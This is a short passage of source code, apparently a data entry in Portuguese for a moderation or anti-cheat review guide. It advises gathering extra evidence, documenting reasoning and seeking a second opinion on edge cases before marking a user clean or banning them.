        body: "Edge case exige EVIDÊNCIA EXTRA, não veredito automático.\n\n• Documenta contexto user\n• Regra servidor\n• Evidência técnica além do edge\n• Segunda opinião grupo privado\n\nNa dúvida: SUSPEITO + pedir mais evidência. Não CLEAN confiante nem BAN apressado.",
      },
    ],
    ["Contexto user completo", "Regra servidor edge cases", "Evidência extra além do flag", "Hash/comparar stock", "Documentar raciocínio", "Segunda opinião se dúvida"]),
];
